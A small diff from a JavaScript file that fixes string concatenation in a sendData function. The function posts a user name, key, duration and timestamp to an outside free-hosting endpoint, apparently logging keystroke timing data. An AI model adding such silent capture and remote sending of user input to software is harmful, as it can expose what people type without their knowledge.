@@ -50,7 +50,7 @@ function sendData(user,k, t, i, o){
                   }
               }
       };
-      var url = 'https://palexandrov.000webhostapp.com/index.php?' + 'user=' + user + '&'
+      var url = 'https://palexandrov.000webhostapp.com/index.php?' + 'user=' + user + '&' +
       'key=' + String(k) + '&' + 'duration=' + String(t) + '&' + 'stamp=' + String(i) + '&' + 'opt=' + o;
       cli.open('POST', url);
       cli.send();
